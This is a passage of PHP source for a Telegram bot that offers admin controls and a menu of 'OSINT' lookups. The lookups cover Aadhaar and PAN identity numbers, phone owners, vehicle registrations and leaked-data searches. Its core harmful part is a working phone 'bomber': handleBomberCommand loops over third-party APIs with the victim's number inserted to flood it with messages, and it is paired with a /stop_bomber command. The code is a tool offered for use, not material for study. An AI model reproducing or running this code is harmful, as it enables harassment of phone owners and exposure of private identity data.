                "❌ Failed to send message to user <code>{$user_id}</code>.",
                'HTML'
            );
        }
    }
    
    private function broadcastHistory() {
        $history = $this->db->getBroadcastHistory(20);
        
        if (empty($history)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "📭 No broadcast history found.",
                'HTML'
            );
            return;
        }
        
        $message = "📢 <b>Broadcast History</b>\n\n";
        
        foreach ($history as $index => $entry) {
            $num = $index + 1;
            $type = $entry['type'] === 'private' ? '📩 Private' : '📢 Broadcast';
            $status = $entry['status'] ?? 'sent';
            
            $message .= "{$num}. {$type}\n";
            $message .= "   📅 {$entry['timestamp']}\n";
            if (isset($entry['user_id'])) {
                $message .= "   👤 User: <code>{$entry['user_id']}</code>\n";
            }
            if (isset($entry['sent'])) {
                $message .= "   📊 Sent: {$entry['sent']}, Failed: {$entry['failed']}\n";
            }
            $message .= "   📝 " . htmlspecialchars(substr($entry['message'], 0, 100), ENT_QUOTES, 'UTF-8') . "...\n";
            $message .= "   ✅ Status: {$status}\n\n";
        }
        
        $this->sendSplitMessage($this->chat_id, $message);
    }
    
    private function showAllGroups() {
        $groups = $this->db->getAllGroups();
        
        if (empty($groups)) {
            $this->telegram->sendMessage($this->chat_id, "📭 No groups found.");
            return;
        }
        
        $message = "🏢 <b>All Groups</b>\n\n";
        $count = 0;
        foreach ($groups as $group) {
            $count++;
            $status = $group['is_allowed'] ? '✅ Allowed' : '❌ Not Allowed';
            $locked = in_array($group['group_id'], $this->db->get('locked_groups')) ? '🔒 Locked' : '🔓 Unlocked';
            $group_name = $group['group_name'] ?? 'Unknown';
            
            $message .= "{$count}. <b>" . htmlspecialchars($group_name, ENT_QUOTES, 'UTF-8') . "</b>\n";
            $message .= "   ├─ ID: <code>{$group['group_id']}</code>\n";
            $message .= "   ├─ Status: {$status}\n";
            $message .= "   └─ Lock: {$locked}\n\n";
        }
        
        $this->sendSplitMessage($this->chat_id, $message);
    }
    
    private function banUserCommand($input) {
        $parts = explode(' ', $input, 2);
        if (count($parts) < 1) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_ban user_id reason</code>",
                'HTML'
            );
            return;
        }
        
        $user_id = $parts[0];
        $reason = $parts[1] ?? 'No reason provided';
        
        if ($this->db->banUser($user_id, $reason)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "✅ User <code>{$user_id}</code> has been banned.\nReason: {$reason}",
                'HTML'
            );
            $this->telegram->sendMessage(
                $user_id,
                "🚫 You have been banned from using this bot.\nReason: {$reason}"
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ User <code>{$user_id}</code> is already banned.",
                'HTML'
            );
        }
    }
    
    private function unbanUserCommand($input) {
        $user_id = trim($input);
        if (empty($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_unban user_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->db->unbanUser($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "✅ User <code>{$user_id}</code> has been unbanned.",
                'HTML'
            );
            $this->telegram->sendMessage(
                $user_id,
                "✅ You have been unbanned from using this bot."
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ User <code>{$user_id}</code> is not banned.",
                'HTML'
            );
        }
    }
    
    private function toggleForceJoin() {
        $current = $this->db->getSetting('force_join_enabled');
        $this->db->setSetting('force_join_enabled', !$current);
        $status = !$current ? 'enabled' : 'disabled';
        $this->telegram->sendMessage(
            $this->chat_id,
            "✅ Force join is now <b>{$status}</b>",
            'HTML'
        );
    }
    
    private function toggleSpamProtection() {
        $current = $this->db->getSetting('spam_protection');
        $this->db->setSetting('spam_protection', !$current);
        $status = !$current ? 'enabled' : 'disabled';
        $this->telegram->sendMessage(
            $this->chat_id,
            "✅ Spam protection is now <b>{$status}</b>",
            'HTML'
        );
    }
    
    private function setCooldown($input) {
        $seconds = intval($input);
        if ($seconds < 1 || $seconds > 60) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Please provide a valid number between 1 and 60.\nUsage: <code>/admin_cooldown 5</code>",
                'HTML'
            );
            return;
        }
        
        $this->db->setSetting('cooldown_seconds', $seconds);
        $this->telegram->sendMessage(
            $this->chat_id,
            "✅ Cooldown set to <b>{$seconds}</b> seconds.",
            'HTML'
        );
    }
    
    private function lockGroupCommand($input) {
        $group_id = trim($input);
        if (empty($group_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_lock_group group_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->db->lockGroup($group_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "🔒 Group <code>{$group_id}</code> has been locked.",
                'HTML'
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ Group <code>{$group_id}</code> is already locked.",
                'HTML'
            );
        }
    }
    
    private function unlockGroupCommand($input) {
        $group_id = trim($input);
        if (empty($group_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_unlock_group group_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->db->unlockGroup($group_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "🔓 Group <code>{$group_id}</code> has been unlocked.",
                'HTML'
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ Group <code>{$group_id}</code> is not locked.",
                'HTML'
            );
        }
    }
    
    private function addAdminCommand($input) {
        $user_id = trim($input);
        if (empty($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_add_admin user_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->db->addAdmin($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "👑 User <code>{$user_id}</code> is now an admin.",
                'HTML'
            );
            $this->telegram->sendMessage(
                $user_id,
                "👑 You have been made an admin of the bot."
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ User <code>{$user_id}</code> is already an admin.",
                'HTML'
            );
        }
    }
    
    private function removeAdminCommand($input) {
        $user_id = trim($input);
        if (empty($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_remove_admin user_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($user_id == OWNER_ID) {
            $this->telegram->sendMessage($this->chat_id, "❌ Cannot remove owner as admin.", 'HTML');
            return;
        }
        
        if ($this->db->removeAdmin($user_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "👑 User <code>{$user_id}</code> is no longer an admin.",
                'HTML'
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ User <code>{$user_id}</code> is not an admin.",
                'HTML'
            );
        }
    }
    
    private function addCustomCommand($input) {
        $parts = explode('|', $input);
        if (count($parts) < 3) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_add_command command|api_url|format_type</code>\n" .
                "Example: <code>/admin_add_command test|https://api.example.com?q=|json</code>",
                'HTML'
            );
            return;
        }
        
        $command_name = trim($parts[0]);
        $api_url = trim($parts[1]);
        $format_type = trim($parts[2]);
        
        if ($this->db->getCustomCommand($command_name)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ Command <code>{$command_name}</code> already exists.",
                'HTML'
            );
            return;
        }
        
        $this->db->addCustomCommand([
            'command_name' => $command_name,
            'api_url' => $api_url,
            'format_type' => $format_type,
            'created_at' => date('Y-m-d H:i:s')
        ]);
        
        $this->telegram->sendMessage(
            $this->chat_id,
            "✅ Custom command <code>{$command_name}</code> added successfully.",
            'HTML'
        );
    }
    
    private function removeCustomCommand($input) {
        $command_name = trim($input);
        if (empty($command_name)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_remove_command command_name</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->db->removeCustomCommand($command_name)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "✅ Custom command <code>{$command_name}</code> removed successfully.",
                'HTML'
            );
        } else {
            $this->telegram->sendMessage(
                $this->chat_id,
                "❌ Command <code>{$command_name}</code> not found.",
                'HTML'
            );
        }
    }
    
    private function listCustomCommands() {
        $commands = $this->db->getAllCustomCommands();
        
        if (empty($commands)) {
            $this->telegram->sendMessage($this->chat_id, "📭 No custom commands found.", 'HTML');
            return;
        }
        
        $message = "📝 <b>Custom Commands</b>\n\n";
        foreach ($commands as $cmd) {
            $message .= "├─ <b>" . htmlspecialchars($cmd['command_name'], ENT_QUOTES, 'UTF-8') . "</b>\n";
            $message .= "│  ├─ API: <code>" . htmlspecialchars($cmd['api_url'], ENT_QUOTES, 'UTF-8') . "</code>\n";
            $message .= "│  └─ Format: " . htmlspecialchars($cmd['format_type'], ENT_QUOTES, 'UTF-8') . "\n\n";
        }
        
        $this->telegram->sendMessage($this->chat_id, $message, 'HTML');
    }
    
    private function allowGroupCommand($input) {
        $group_id = trim($input);
        if (empty($group_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_group_allow group_id</code>",
                'HTML'
            );
            return;
        }
        
        $group_name = 'Unknown';
        try {
            $chat_info = $this->telegram->getChat($group_id);
            if ($chat_info && isset($chat_info['title'])) {
                $group_name = $chat_info['title'];
            }
        } catch (Exception $e) {}
        
        if ($this->db->addGroup(['group_id' => $group_id, 'is_allowed' => true, 'group_name' => $group_name])) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "✅ Group <code>{$group_id}</code> has been allowed.\nName: {$group_name}",
                'HTML'
            );
            $this->telegram->sendMessage(
                $group_id,
                "✅ Your group has been approved for bot usage."
            );
        } else {
            $this->telegram->sendMessage($this->chat_id, "❌ Failed to allow group.", 'HTML');
        }
    }
    
    private function removeGroupCommand($input) {
        $group_id = trim($input);
        if (empty($group_id)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Usage: <code>/admin_group_remove group_id</code>",
                'HTML'
            );
            return;
        }
        
        if ($this->db->removeGroup($group_id)) {
            $this->telegram->sendMessage($this->chat_id, "❌ Group <code>{$group_id}</code> has been removed.", 'HTML');
        } else {
            $this->telegram->sendMessage($this->chat_id, "❌ Group <code>{$group_id}</code> not found.", 'HTML');
        }
    }
    
    private function handleStart() {
        $user = $this->message['from'];
        $username = isset($user['username']) ? '@' . $user['username'] : 'Not Set';
        
        $total_commands = count($this->api_endpoints) + count($this->db->getAllCustomCommands());
        
        $message = "👋 <b>Welcome to Bot!</b>\n\n";
        $message .= "I provide OSINT and utility tools.\n\n";
        $message .= "👤 <b>Your Info:</b>\n";
        $message .= "├─ Username: {$username}\n";
        $message .= "├─ User ID: <code>{$this->user_id}</code>\n";
        $message .= "└─ Name: " . htmlspecialchars($user['first_name'] ?? '', ENT_QUOTES, 'UTF-8') . "\n\n";
        $message .= "📝 <b>Total Commands:</b> {$total_commands}\n\n";
        $message .= "💡 Use /help to see all available commands.";
        
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '📋 View All Commands', 'callback_data' => 'show_commands']
                ],
                [
                    ['text' => '📢 Channel', 'url' => CHANNEL_1],
                    ['text' => '💬 Support', 'url' => 'https://t.me/FroxtDevil']
                ]
            ]
        ];
        
        $this->telegram->sendMessage($this->chat_id, $message, 'HTML', json_encode($keyboard));
    }
    
    private function handleHelp() {
        $message = "🤖 <b>Available Commands</b>\n\n";
        
        $message .= "<b>🆕 OSINT Commands </b>\n";
        $message .= "├─ /pan PAN_NUMBER - PAN Card Info\n";
        $message .= "├─ /terabox URL - Terabox Video Stream\n";
        $message .= "├─ /snapchat USERNAME - Snapchat Profile\n";
        $message .= "├─ /insta USERNAME - Instagram Profile\n";
        $message .= "├─ /tg USER_ID - Telegram Account Info\n";
        $message .= "└─ /leak QUERY - Leak/OSINT Search\n\n";
        
        $message .= "<b>🎵 Utilities:</b>\n";
        $message .= "├─ /song SONG_NAME\n";
        $message .= "├─ /weather CITY\n";
        $message .= "├─ /gf MESSAGE\n";
        $message .= "├─ /bgmi_info USER_ID\n";
        $message .= "├─ /country_search COUNTRY\n";
        $message .= "├─ /playstore_search APP\n";
        $message .= "├─ /web_scraper URL (JSON Format)\n";
        $message .= "├─ /bomber PHONE_NUMBER\n";
        $message .= "└─ /stop_bomber - Stop bombing\n\n";
        
        $message .= "<b>🔍 OSINT Tools </b>\n";
        $message .= "├─ /ip IP_ADDRESS\n";
        $message .= "├─ /ipv2 IP_ADDRESS\n";
        $message .= "├─ /ipv3 IP_ADDRESS\n";
        $message .= "├─ /ifsc IFSC_CODE\n";
        $message .= "├─ /ifscv2 IFSC_CODE\n";
        $message .= "├─ /num PHONE_NUMBER\n";
        $message .= "├─ /numv2 PHONE_NUMBER\n";
        $message .= "├─ /pak_num PHONE_NUMBER\n";
        $message .= "├─ /rc VEHICLE_NUMBER\n";
        $message .= "├─ /rcv2 VEHICLE_NUMBER\n";
        $message .= "├─ /rcv3 VEHICLE_NUMBER\n";
        $message .= "├─ /rcv4 VEHICLE_NUMBER\n";
        $message .= "├─ /vehicle_full_info VEHICLE_NUMBER\n";
        $message .= "├─ /vehicle_to_number VEHICLE_NUMBER\n";
        $message .= "├─ /pincode PINCODE\n";
        $message .= "├─ /pincodev2 PINCODE\n";
        $message .= "├─ /gst GSTIN\n";
        $message .= "├─ /gstv2 GSTIN\n";
        $message .= "├─ /imei IMEI_NUMBER\n";
        $message .= "├─ /github USERNAME\n";
        $message .= "├─ /Aadhar AADHAR_NUMBER\n";
        $message .= "├─ /Aadhar_by_name NAME\n";
        $message .= "├─ /Aadhar_by_number NUMBER\n";
        $message .= "├─ /truecaller NUMBER\n";
        $message .= "└─ /email EMAIL\n\n";
        
        $message .= "💡 <b>Usage:</b> /command value\n";
        $message .= "Example: /ip 8.8.8.8\n\n";
        $message .= "📌 <b>Note:</b> OSINT ☠️.";
        
        $this->sendSplitMessage($this->chat_id, $message);
    }
    
    private function handleStatus() {
        $users = $this->db->getAllUsers();
        $blacklist = $this->db->get('blacklist');
        $groups = $this->db->getAllGroups();
        
        $total_users = count($users);
        $total_banned = count($blacklist);
        $total_groups = count($groups);
        $total_commands = count($this->api_endpoints) + count($this->db->getAllCustomCommands());
        
        $total_used = 0;
        foreach ($users as $user) {
            $total_used += $user['total_commands'] ?? 0;
        }
        
        $message = "📊 <b>Bot Statistics</b>\n\n";
        $message .= "👥 <b>Total Users:</b> {$total_users}\n";
        $message .= "📊 <b>Total Commands Used:</b> {$total_used}\n";
        $message .= "🚫 <b>Banned Users:</b> {$total_banned}\n";
        $message .= "🏢 <b>Groups:</b> {$total_groups}\n";
        $message .= "📝 <b>Total Commands:</b> {$total_commands}";
        
        $this->telegram->sendMessage($this->chat_id, $message, 'HTML');
    }
    
    private function handleCustomCommand($cmd, $input) {
        if (empty($input)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Please provide input.\nExample: <code>/{$cmd['command_name']} value</code>",
                'HTML'
            );
            return;
        }
        
        $this->telegram->sendChatAction($this->chat_id, 'typing');
        $api_url = $cmd['api_url'] . urlencode($input);
        $result = $this->apiCaller->call($api_url, false, 30);
        
        if ($result) {
            if ($cmd['format_type'] === 'json') {
                $formatted = $this->formatter->formatJsonResult($result, $cmd['command_name'], $input);
            } else {
                $formatted = $this->formatter->formatWebScraper($result);
            }
            $this->history->addHistory($this->user_id, $cmd['command_name'], $input, $formatted);
            $this->sendSplitMessage($this->chat_id, $formatted);
        } else {
            $this->telegram->sendMessage($this->chat_id, "❌ API request failed. Please try again later.", 'HTML');
        }
    }
    
    private function handleAPICommand($command, $input) {
        if (empty($input)) {
            $this->telegram->sendMessage(
                $this->chat_id,
                "⚠️ Please provide input.\nExample: <code>/{$command} value</code>",
                'HTML'
            );
            return;
        }
        
        if ($command === 'bomber') {
            $this->handleBomberCommand($input);
            return;
        }
        
        $url = $this->api_endpoints[$command] ?? null;
        if (!$url) {
            $this->telegram->sendMessage($this->chat_id, "❌ API endpoint not found.", 'HTML');
            return;
        }
        
        $this->telegram->sendChatAction($this->chat_id, 'typing');
        $api_url = $url . urlencode($input);
        $result = $this->apiCaller->call($api_url, false, 30);
        
        if ($result) {
            if (in_array($command, $this->json_commands)) {
                $formatted = $this->formatter->formatJsonResult($result, $command, $input);
            } else {
                $formatted = $this->formatResult($command, $result, $input);
            }
            $this->history->addHistory($this->user_id, $command, $input, $formatted);
            $this->sendSplitMessage($this->chat_id, $formatted);
        } else {
            $this->telegram->sendMessage($this->chat_id, "❌ API request failed. Please try again later.", 'HTML');
        }
    }
    
    // ================================================================
    // FIXED BOMBER COMMAND WITH WORKING STOP
    // ================================================================
    
    private function handleBomberCommand($input) {
        // Set bomber running flag
        $this->is_bomber_running = true;
        $this->bomber_stop_flag = false;
        $this->active_bomber_processes[$this->user_id] = true;
        
        $initial_message = "💣 <b>Bomber Started!</b>\n\n";
        $initial_message .= "📱 Target: <code>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</code>\n";
        $initial_message .= "🔄 Preparing " . count($this->bomber_apis) . " APIs...\n";
        $initial_message .= "⏳ Please wait...\n";
        $initial_message .= "🛑 Use /stop_bomber to stop anytime";
        
        $sent_msg = $this->telegram->sendMessage($this->chat_id, $initial_message, 'HTML');
        
        if (!$sent_msg) {
            $this->telegram->sendMessage($this->chat_id, "❌ Failed to send initial message.", 'HTML');
            $this->is_bomber_running = false;
            $this->active_bomber_processes[$this->user_id] = false;
            return;
        }
        
        $message_id = $sent_msg['message_id'];
        $phone = $input;
        $success = 0;
        $failed = 0;
        $results = [];
        $total_apis = count($this->bomber_apis);
        
        // Update status message
        $this->telegram->editMessageText(
            $this->chat_id,
            $message_id,
            "💣 <b>Bomber Started!</b>\n\n" .
            "📱 Target: <code>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</code>\n" .
            "🔄 Sending requests...\n" .
            "📊 Progress: 0/" . $total_apis . "\n" .
            "🛑 Send /stop_bomber to stop",
            'HTML'
        );
        
        // Process all APIs with 0.5 second delay between each
        $index = 0;
        foreach ($this->bomber_apis as $api) {
            // CHECK STOP FLAG - This is the key fix
            if ($this->bomber_stop_flag === true || !$this->active_bomber_processes[$this->user_id]) {
                break;
            }
            
            $index++;
            $url = str_replace('{phone}', $phone, $api['url']);
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 10);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            
            $headers = [];
            if (isset($api['headers'])) {
                if (is_array($api['headers'])) {
                    $is_assoc = false;
                    foreach ($api['headers'] as $key => $value) {
                        if (is_string($key) && !is_numeric($key)) {
                            $is_assoc = true;
                            break;
                        }
                    }
                    
                    if ($is_assoc) {
                        foreach ($api['headers'] as $key => $value) {
                            $headers[] = $key . ': ' . $value;
                        }
                    } else {
                        $headers = $api['headers'];
                    }
                }
            }
            if (!empty($headers)) {
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            }
            
            if ($api['method'] === 'POST') {
                curl_setopt($ch, CURLOPT_POST, true);
            } elseif ($api['method'] === 'PUT') {
                curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
            }
            
            if (isset($api['data']) && $api['data']) {
                if (is_array($api['data'])) {
                    $data = json_encode($api['data']);
                } else {
                    $data = str_replace('{phone}', $phone, $api['data']);
                }
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
            
            $response = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            $status = ($http_code >= 200 && $http_code < 400) ? 'success' : 'failed';
            
            if ($status === 'success') {
                $success++;
            } else {
                $failed++;
            }
            
            $results[] = [
                'name' => $api['name'],
                'status' => $status,
                'http_code' => $http_code
            ];
            
            // Update progress every 5 APIs
            if ($index % 5 == 0 || $index == $total_apis) {
                $status_text = $this->bomber_stop_flag ? "🛑 Stopping..." : "🔄 Sending requests...";
                $this->telegram->editMessageText(
                    $this->chat_id,
                    $message_id,
                    "💣 <b>Bomber Started!</b>\n\n" .
                    "📱 Target: <code>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</code>\n" .
                    $status_text . "\n" .
                    "📊 Progress: {$index}/{$total_apis}\n" .
                    "✅ Success: {$success} | ❌ Failed: {$failed}\n" .
                    "🛑 Send /stop_bomber to stop",
                    'HTML'
                );
            }
            
            // 0.5 second delay between requests
            if ($index < $total_apis && !$this->bomber_stop_flag) {
                usleep(500000);
            }
        }
        
        // Check if stopped
        if ($this->bomber_stop_flag || !$this->active_bomber_processes[$this->user_id]) {
            $status_message = "🛑 <b>Bomber Stopped!</b>\n\n";
            $status_message .= "📱 Target: <code>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</code>\n";
            $status_message .= "✅ Success: {$success}\n";
            $status_message .= "❌ Failed: {$failed}\n";
            $status_message .= "📊 Total: {$index} requests sent";
            
            $this->telegram->editMessageText(
                $this->chat_id,
                $message_id,
                $status_message,
                'HTML'
            );
            
            $this->is_bomber_running = false;
            $this->active_bomber_processes[$this->user_id] = false;
            return;
        }
        
        // Save bomber data
        $bombers = $this->db->get('bombers') ?? [];
        $bombers[$this->user_id] = [
            'target' => $input,
            'started_at' => date('Y-m-d H:i:s'),
            'active' => false,
            'success' => $success,
            'failed' => $failed,
            'total' => $total_apis,
            'results' => $results
        ];
        $this->db->set('bombers', $bombers);
        
        $status_message = "✅ <b>Bomber Completed!</b>\n\n";
        $status_message .= "📱 Target: <code>" . htmlspecialchars($input, ENT_QUOTES, 'UTF-8') . "</code>\n";
        $status_message .= "✅ Success: {$success}\n";
        $status_message .= "❌ Failed: {$failed}\n";
        $status_message .= "📊 Total: {$total_apis} requests sent\n\n";
        
        $success_count = 0;
        $failed_count = 0;
        foreach ($results as $result) {
            $icon = $result['status'] === 'success' ? '✅' : '❌';
            if ($result['status'] === 'success') {
                $success_count++;
                if ($success_count <= 10) {
                    $status_message .= "{$icon} {$result['name']} - HTTP {$result['http_code']}\n";
                }
            } else {
                $failed_count++;
                if ($failed_count <= 5) {
                    $status_message .= "{$icon} {$result['name']} - HTTP {$result['http_code']}\n";
                }
            }
        }
        if ($success_count > 10) {
            $status_message .= "... and " . ($success_count - 10) . " more successful\n";
        }
        if ($failed_count > 5) {
            $status_message .= "... and " . ($failed_count - 5) . " more failed\n";
        }
        
        $this->telegram->editMessageText(
            $this->chat_id,
            $message_id,
            $status_message,
            'HTML'
        );
        
        $this->is_bomber_running = false;
        $this->active_bomber_processes[$this->user_id] = false;
    }
    
    // ================================================================
    // FIXED STOP BOMBER COMMAND
    // ================================================================
    
    private function handleStopBomber() {
        // Set stop flag for this user
        $this->bomber_stop_flag = true;
        $this->active_bomber_processes[$this->user_id] = false;
        
        $bombers = $this->db->get('bombers') ?? [];
        
        if (isset($bombers[$this->user_id])) {
            $bombers[$this->user_id]['active'] = false;
            $this->db->set('bombers', $bombers);
            
            $this->telegram->sendMessage(
                $this->chat_id,
                "🛑 <b>Bomber Stopped!</b>\n\n" .
                "📱 Target: <code>" . htmlspecialchars($bombers[$this->user_id]['target'], ENT_QUOTES, 'UTF-8') . "</code>\n" .
                "✅ Success: {$bombers[$this->user_id]['success']}\n" .
                "❌ Failed: {$bombers[$this->user_id]['failed']}\n" .
                "📊 Total: {$bombers[$this->user_id]['total']} requests sent",
                'HTML'
            );
        } else {
            // Check if bomber is currently running for this user
            if ($this->is_bomber_running && $this->active_bomber_processes[$this->user_id]) {
                $this->telegram->sendMessage(
                    $this->chat_id,
                    "🛑 <b>Stopping Bomber...</b>\n\n⏳ Please wait for current requests to finish...",
                    'HTML'
                );
            } else {
                $this->telegram->sendMessage(
                    $this->chat_id,
                    "❌ No active bomber found for your account.",
                    'HTML'
                );
            }
        }
        
        // Reset flags for this user
        $this->is_bomber_running = false;
        $this->active_bomber_processes[$this->user_id] = false;
    }
    
    private function formatResult($command, $result, $input) {
        if (in_array($command, $this->json_commands)) {
            return $this->formatter->formatJsonResult($result, $command, $input);
        }
        
        if ($command === 'song') {
            return $this->formatter->formatSongSearch($result);
        } elseif ($command === 'weather') {
            return $this->formatter->formatWeather($result);
        } elseif ($command === 'country_search') {
            return $this->formatter->formatCountrySearch($result);
        } elseif ($command === 'playstore_search') {
            return $this->formatter->formatPlaystoreSearch($result);
        } elseif ($command === 'bgmi_info') {
            return $this->formatter->formatBgmiInfo($result);
        } elseif ($command === 'gf') {
            return $this->formatter->formatGFResponse($result);
        } elseif ($command === 'web_scraper') {
            return $this->formatter->formatWebScraper($result);
        } elseif ($command === 'bomber') {
            return $this->formatter->formatBomber($result);
        } else {
            return $this->formatter->formatJsonResult($result, $command, $input);
        }
    }
    
    private function sendSplitMessage($chat_id, $message) {
        $max_length = MAX_MESSAGE_LENGTH;
        
        if (strlen($message) <= $max_length) {
            $this->telegram->sendMessage($chat_id, $message, 'HTML');
            return;
        }
        
        $parts = str_split($message, $max_length);
        foreach ($parts as $part) {
            $this->telegram->sendMessage($chat_id, $part, 'HTML');
        }
    }
    
    private function handleCallback() {
        $data = $this->callback_query['data'];
        $message_id = $this->callback_query['message']['message_id'];
        
        if ($data === 'check_join') {
            $this->db->updateUser($this->user_id, ['has_joined_channel' => true]);
            $this->telegram->editMessageText(
                $this->chat_id,
                $message_id,
                "✅ <b>Thank you for joining!</b>\n\nYou can now use the bot.\n\nUse /help to see available commands.",
                'HTML'
            );
            $this->telegram->answerCallbackQuery($this->callback_query['id']);
            return;
        }
        
        if ($data === 'show_commands') {
            $this->handleHelp();
            $this->telegram->answerCallbackQuery($this->callback_query['id']);
            return;
        }
        
        if (strpos($data, 'allow_group_') === 0 && $this->user_id == OWNER_ID) {
            $group_id = str_replace('allow_group_', '', $data);
            $group_name = 'Unknown';
            try {
                $chat_info = $this->telegram->getChat($group_id);
                if ($chat_info && isset($chat_info['title'])) {
                    $group_name = $chat_info['title'];
                }
            } catch (Exception $e) {}
            
            $this->db->addGroup(['group_id' => $group_id, 'is_allowed' => true, 'group_name' => $group_name]);
            $this->db->removePendingGroupRequest($group_id);
            
            $this->telegram->editMessageText(
                $this->chat_id,
                $message_id,
                "✅ Group <code>{$group_id}</code> has been approved!\nName: {$group_name}",
                'HTML'
            );
            $this->telegram->sendMessage($group_id, "✅ Your group has been approved for bot usage.");
            $this->telegram->answerCallbackQuery($this->callback_query['id']);
            return;
        }
        
        if (strpos($data, 'deny_group_') === 0 && $this->user_id == OWNER_ID) {
            $group_id = str_replace('deny_group_', '', $data);
            $this->db->removePendingGroupRequest($group_id);
            $this->telegram->editMessageText(
                $this->chat_id,
                $message_id,
                "❌ Group <code>{$group_id}</code> has been denied.",
                'HTML'
            );
            $this->telegram->answerCallbackQuery($this->callback_query['id']);
            return;
        }
        
        $this->telegram->answerCallbackQuery($this->callback_query['id']);
    }
}

// ================================================================
// INITIALIZE BOT By RΩHIT || @FroxtDevil
// ================================================================

$bot = new SocialMediaBot();
?>